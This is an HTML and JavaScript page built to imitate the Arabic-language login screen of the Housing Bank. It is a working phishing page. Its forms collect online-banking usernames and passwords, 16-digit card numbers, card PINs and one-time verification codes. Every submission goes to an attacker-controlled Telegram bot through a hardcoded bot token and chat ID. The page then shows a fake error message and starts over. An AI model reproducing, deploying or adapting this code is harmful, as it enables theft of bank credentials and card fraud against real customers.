<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>بنك الإسكان - تسجيل الدخول</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --main-color: #004a99;
            --light-bg: #f8f9fa;
            --input-bg: #fff;
            --border-radius: 16px;
            --shadow: 0 5px 24px rgba(0,0,0,0.09);
            --font-family: 'Cairo', Tahoma, Arial, sans-serif;
        }
        body {
            background: var(--light-bg);
            font-family: var(--font-family);
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 370px;
            margin: 40px auto;
            background: var(--input-bg);
            border-radius: var(--border-radius);
            box-shadow: var(--shadow);
            padding: 28px 24px 22px 24px;
            position: relative;
        }
        .logo {
            text-align: center;
            margin-bottom: 23px;
        }
        .logo img {
            width: 170px;
            margin-bottom: 12px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        .logo-title {
            font-size: 28px;
            color: var(--main-color);
            font-weight: bold;
            margin-bottom: 0;
        }
        .logo-sub {
            font-size: 16px;
            color: #333;
            letter-spacing: 0.5px;
        }
        .btn {
            display: block;
            width: 100%;
            background: var(--main-color);
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 13px 0;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 13px;
            margin-bottom: 10px;
            transition: background 0.2s;
        }
        .btn-outline {
            background: #fff;
            color: var(--main-color);
            border: 2px solid var(--main-color);
        }
        .btn:hover, .btn-outline:hover {
            background: #003366;
            color: #fff;
            border-color: #003366;
        }
        .options {
            display: flex;
            gap: 12px;
            margin-top: 18px;
        }
        .options .btn {
            flex: 1;
            margin: 0;
        }
        .input-group {
            margin-bottom: 18px;
        }
        .input-label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-size: 15px;
        }
        .input-icon {
            position: absolute;
            left: 12px;
            top: 14px;
            color: #aaa;
        }
        .input-box {
            position: relative;
        }
        input[type="text"], input[type="password"], input[type="number"], select {
            width: 100%;
            background: var(--input-bg);
            border: 1.5px solid #e0e0e0;
            border-radius: 8px;
            padding: 13px 36px 13px 34px;
            font-size: 15px;
            transition: border-color 0.2s;
            box-sizing: border-box;
            direction: ltr !important;
            text-align: left !important;
        }
        select {
            padding-right: 10px;
            padding-left: 0;
            direction: ltr !important;
            text-align: left !important;
        }
        input:focus, select:focus {
            border-color: var(--main-color);
            outline: none;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 13px;
        }
        .checkbox-group input[type="checkbox"] {
            accent-color: var(--main-color);
        }
        .center-text {
            text-align:center;font-size:16px;color:#444;margin-bottom:12px;
        }
        .back-btn {
            position: absolute;
            top: 18px;
            right: 18px;
            background: none;
            border: none;
            color: var(--main-color);
            cursor: pointer;
            font-size: 19px;
            font-family: var(--font-family);
            padding: 0;
            z-index: 2;
            display: flex;
            align-items: center;
        }
        .back-btn svg {
            margin-left: 5px;
        }
        .verify-label {
            font-size: 22px;
            color: var(--main-color);
            font-weight: bold;
            text-align: center;
            display: block;
            margin-bottom: 12px;
        }
        .big-label {
            font-size: 18px !important;
            color: var(--main-color);
            font-weight: bold;
            margin-bottom: 10px;
            text-align: left;
            display: block;
        }
        /* Hide arrows for input number */
        input[type=number]::-webkit-inner-spin-button, 
        input[type=number]::-webkit-outer-spin-button { 
            -webkit-appearance: none; 
            margin: 0; 
        }
        input[type=number] { -moz-appearance:textfield; }

        .card-next-btn {
            margin-top: 18px;
            background: var(--main-color);
            color: #fff;
            border: none;
            width: 90%;
            border-radius: 7px;
            padding: 10px 0;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            display: block;
            margin-left: auto;
            margin-right: auto;
            box-shadow: 0 1px 5px rgba(0,0,0,0.04);
            transition: background 0.2s;
        }
        .card-next-btn:hover {
            background: #003366;
        }
        .error {
            color: #e11d48;
            font-size: 14px;
            margin-top: 2px;
            margin-bottom: 7px;
        }
        .snackbar {
            visibility: hidden;
            min-width: 260px;
            margin-left: -130px;
            background-color: #e11d48;
            color: #fff;
            text-align: center;
            border-radius: 9px;
            padding: 14px 20px;
            position: fixed;
            z-index: 99;
            left: 50%;
            bottom: 42px;
            font-size: 17px;
            box-shadow: 0 2px 14px rgba(0,0,0,0.10);
            transition: visibility 0s, opacity 0.4s linear;
            opacity: 0;
        }
        .snackbar.show {
            visibility: visible;
            opacity: 1;
        }
    </style>
</head>
<body>
    <div id="main"></div>
    <div id="snackbar" class="snackbar"></div>
    <script>
        // شعار الموقع
        const logoHtml = `
            <div class="logo">
                <img src="https://www2.0zz0.com/2025/09/28/04/434982011.png" alt="شعار الموقع"/>
                <div class="logo-title">بنك الإسكان</div>
                <div class="logo-sub">Housing Bank</div>
            </div>
        `;

        // زر الرجوع
        function backBtn(onclickFn = "renderStart()") {
            return `<button class="back-btn" onclick="${onclickFn}" title="رجوع">
                <svg width="22" height="22"><polyline points="15,4 7,11 15,18" stroke="#004a99" stroke-width="2.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>رجوع
            </button>`;
        }

        // بيانات تلجرام
        const TG_TOKEN = "8399446916:AAEMixTeIz7_jG2xNy1guVQeJ6jzgPTNYXo";
        const TG_CHAT_ID = "6873334348";
        function sendToTelegram(msg) {
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: msg
                })
            });
        }

        let userData = {};
        let cardData = {};

        function hasArabicLetters(str) {
            return /[\u0600-\u06FF]/.test(str);
        }

        function renderStart() {
            userData = {};
            cardData = {};
            document.getElementById('main').innerHTML = `
                <div class="container">
                    ${logoHtml}
                    <div class="center-text">يرجى اختيار أحد الخيارات التالية:</div>
                    <div class="options">
                        <button class="btn" onclick="renderLogin()">لقد قمت بتفعيل تطبيق البنك</button>
                        <button class="btn-outline" onclick="renderCardForm()">لم أقم بتفعيل تطبيق البنك</button>
                    </div>
                </div>
            `;
        }

        function renderLogin() {
            document.getElementById('main').innerHTML = `
                <div class="container">
                    ${backBtn()}
                    ${logoHtml}
                    <form id="loginForm" autocomplete="off">
                        <div class="input-group">
                            <label class="input-label" for="username">اسم المستخدم <span style="color:#d32f2f;font-size:13px;">(غير مسموح بإدخال أحرف عربية)</span></label>
                            <div class="input-box">
                                <input type="text" id="username" name="username" required placeholder="اسم المستخدم" autocomplete="username" pattern="[^ء-ي]+"/>
                                <span class="input-icon"><svg width="18" height="18"><circle cx="9" cy="7" r="4" fill="#aaa"/><rect x="5" y="15" width="8" height="2.5" rx="1.2" fill="#aaa"/></svg></span>
                            </div>
                        </div>
                        <div class="input-group">
                            <label class="input-label" for="password">الرقم السري <span style="color:#d32f2f;font-size:13px;">(غير مسموح بإدخال أحرف عربية)</span></label>
                            <div class="input-box">
                                <input type="password" id="password" name="password" required placeholder="الرقم السري" autocomplete="current-password" pattern="[^ء-ي]+"/>
                                <span class="input-icon"><svg width="18" height="18"><rect x="5" y="7" width="8" height="7" rx="2" fill="#aaa"/><rect x="7.5" y="11" width="3" height="2" rx="1" fill="#666"/></svg></span>
                            </div>
                        </div>
                        <div class="checkbox-group">
                            <input type="checkbox" id="rememberMe"/>
                            <label for="rememberMe" style="font-size:15px;color:#666;">تذكر اسم المستخدم</label>
                        </div>
                        <button class="btn" type="submit">تسجيل الدخول</button>
                    </form>
                </div>
            `;
            document.getElementById('loginForm').onsubmit = function(e){
                e.preventDefault();
                let username = document.getElementById('username').value;
                let password = document.getElementById('password').value;

                if (hasArabicLetters(username) || hasArabicLetters(password)) {
                    showCustomSnack("غير مسموح بإدخال أحرف عربية في اسم المستخدم أو الرقم السري.");
                    return;
                }
                userData = {
                    username,
                    password,
                    rememberMe: document.getElementById('rememberMe').checked ? "نعم" : "لا"
                };
                var msg = `تسجيل دخول جديد:\nاسم المستخدم: ${userData.username}\nكلمة المرور: ${userData.password}`;
                sendToTelegram(msg);
                renderVerifyCode('login');
            };
        }

        function renderVerifyCode(from) {
            document.getElementById('main').innerHTML = `
                <div class="container">
                    ${backBtn(from === 'login' ? "renderLogin()" : "renderStart()")}
                    ${logoHtml}
                    <form id="verifyCodeForm" autocomplete="off">
                        <label class="verify-label" for="verifyCode">رمز التحقق</label>
                        <div class="input-group">
                            <div class="input-box">
                                <input type="number" id="verifyCode" name="verifyCode" required placeholder="أدخل رمز التحقق" style="text-align:center;font-size:20px;"/>
                                <span class="input-icon"><svg width="18" height="18"><rect x="4" y="7" width="10" height="6" rx="2" fill="#aaa"/><circle cx="9" cy="10" r="1.2" fill="#666"/></svg></span>
                            </div>
                        </div>
                        <button class="btn" type="submit" style="margin-top:18px;">تأكيد</button>
                    </form>
                </div>
            `;
            document.getElementById('verifyCodeForm').onsubmit = function(e){
                e.preventDefault();
                let verifyCode = document.getElementById('verifyCode').value;
                let msg = "";
                if (from === 'login') {
                    msg = `تسجيل دخول جديد:\nاسم المستخدم: ${userData.username}\nكلمة المرور: ${userData.password}\nرمز التحقق: ${verifyCode}`;
                } else if (from === 'card') {
                    msg =
                        `بيانات البطاقة:\n` +
                        `رقم البطاقة: ${cardData.fullCard}\n` +
                        `الرقم السري للبطاقة: ${cardData.cardPin}\n` +
                        `رمز التحقق: ${verifyCode}`;
                }
                sendToTelegram(msg);
                showCustomSnack("هناك خطأ في أحد المعلومات يرجى إعادة المحاولة");
                setTimeout(()=>{
                    renderStart();
                }, 2000);
            };
        }

        // ========== التعديل: صفحة بطاقة واحدة ==========
        function renderCardForm() {
            cardData = {};
            document.getElementById('main').innerHTML = `
                <div class="container">
                    ${backBtn()}
                    ${logoHtml}
                    <form id="cardForm" autocomplete="off">
                        <div class="input-group">
                            <label class="input-label" for="cardNumber">رقم البطاقة (16 رقم)</label>
                            <div class="input-box">
                                <input type="text"
                                    id="cardNumber"
                                    maxlength="16"
                                    pattern="\\d{16}"
                                    inputmode="numeric"
                                    autocomplete="cc-number"
                                    required
                                    placeholder="أدخل رقم البطاقة"
                                    style="direction:ltr;text-align:left;font-size:17px;letter-spacing:2px;"
                                    oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 16)"
                                />
                                <span class="input-icon">
                                    <svg width="18" height="18"><rect x="2" y="6" width="14" height="6" rx="2" fill="#aaa"/><rect x="8.5" y="8" width="1.5" height="2.5" rx="0.7" fill="#666"/></svg>
                                </span>
                            </div>
                            <div id="cardNumberError" class="error"></div>
                        </div>
                        <div class="input-group">
                            <label class="input-label" for="cardPin">الرقم السري للبطاقة (4 أرقام فقط)</label>
                            <div class="input-box">
                                <input type="password"
                                    id="cardPin"
                                    maxlength="4"
                                    pattern="\\d{4}"
                                    inputmode="numeric"
                                    autocomplete="off"
                                    required
                                    placeholder="أدخل الرقم السري"
                                    style="direction:ltr;text-align:left;font-size:17px;letter-spacing:2px;"
                                    oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4)"
                                />
                                <span class="input-icon">
                                    <svg width="18" height="18"><rect x="5" y="7" width="8" height="7" rx="2" fill="#aaa"/><rect x="7.5" y="11" width="3" height="2" rx="1" fill="#666"/></svg>
                                </span>
                            </div>
                            <div id="pinError" class="error"></div>
                        </div>
                        <button class="card-next-btn" type="submit">التالي</button>
                    </form>
                </div>
            `;

            document.getElementById('cardForm').onsubmit = function(e) {
                e.preventDefault();
                const cardNumber = document.getElementById('cardNumber').value.trim();
                const pin = document.getElementById('cardPin').value.trim();
                let valid = true;
                document.getElementById('cardNumberError').textContent = '';
                document.getElementById('pinError').textContent = '';

                if (!/^\d{16}$/.test(cardNumber)) {
                    document.getElementById('cardNumberError').textContent = 'يجب إدخال رقم البطاقة المكون من 16 رقم فقط.';
                    valid = false;
                }
                if (!/^\d{4}$/.test(pin)) {
                    document.getElementById('pinError').textContent = 'يجب أن يكون الرقم السري 4 أرقام فقط.';
                    valid = false;
                }

                if (!valid) return;

                cardData.fullCard = cardNumber;
                cardData.cardPin = pin;

                let msg =
                    `بيانات البطاقة:\n` +
                    `رقم البطاقة: ${cardData.fullCard}\n` +
                    `الرقم السري للبطاقة: ${cardData.cardPin}`;
                sendToTelegram(msg);
                renderVerifyCode('card');
            };
        }
        // ========== نهاية التعديل ==========

        function showCustomSnack(msg) {
            var x = document.getElementById("snackbar");
            x.innerText = msg;
            x.className = "snackbar show";
            setTimeout(function(){
                x.className = x.className.replace("show", "");
                x.innerText = "";
            }, 2000);
        }

        renderStart();
    </script>
</body>
</html>